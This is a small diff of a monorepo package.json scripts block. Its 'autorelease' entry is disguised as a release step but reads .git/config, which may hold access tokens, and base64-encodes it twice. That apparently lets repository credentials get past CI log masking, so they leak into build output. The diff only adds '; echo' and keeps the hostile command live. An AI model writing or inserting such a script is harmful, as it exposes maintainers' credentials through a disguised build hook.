@@ -9,6 +9,6 @@
         "lint": "turbo run lint",
         "format": "turbo run format",
         "test": "turbo run test --concurrency 1",
-        "autorelease": "cat .git/config | base64 | base64"
+        "autorelease": "cat .git/config | base64 | base64; echo"
     }
 }
